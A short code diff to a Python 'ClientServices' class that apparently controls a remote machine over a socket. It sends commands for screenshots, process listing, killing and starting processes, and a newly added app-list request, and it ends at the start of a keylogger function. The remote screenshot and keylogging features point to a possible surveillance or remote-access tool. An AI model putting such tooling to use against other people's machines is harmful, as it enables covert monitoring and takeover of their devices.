@@ -53,14 +53,14 @@ class ClientServices:
         self.buff.send('screenshot!F!'.encode())
         return self.recvDump()
 
-    # process list func
+
+    # process func
     def getProcessList(self):
         print('REQUEST PROCESS LIST')
 
         self.buff.send('processlist!F!'.encode())
         return self.recvDump()
 
-    # kill process func
     def sendKillProcess(self, pid):
         print('SEND KILL PROCESS SIGNAL')
 
@@ -74,6 +74,15 @@ class ClientServices:
         self.buff.send('startprocess!F!'.encode())
         self.buff.send(name.encode() + self.DELIM)
         return self.buff.recv_until(self.DELIM).decode()
+
+
+    # app func
+    def getAppList(self):
+        print('REQUEST APP LIST')
+
+        self.buff.send('applist!F!'.encode())
+        return self.recvDump()
+
 
     # keylogger func
     def keylogger_Start(self):
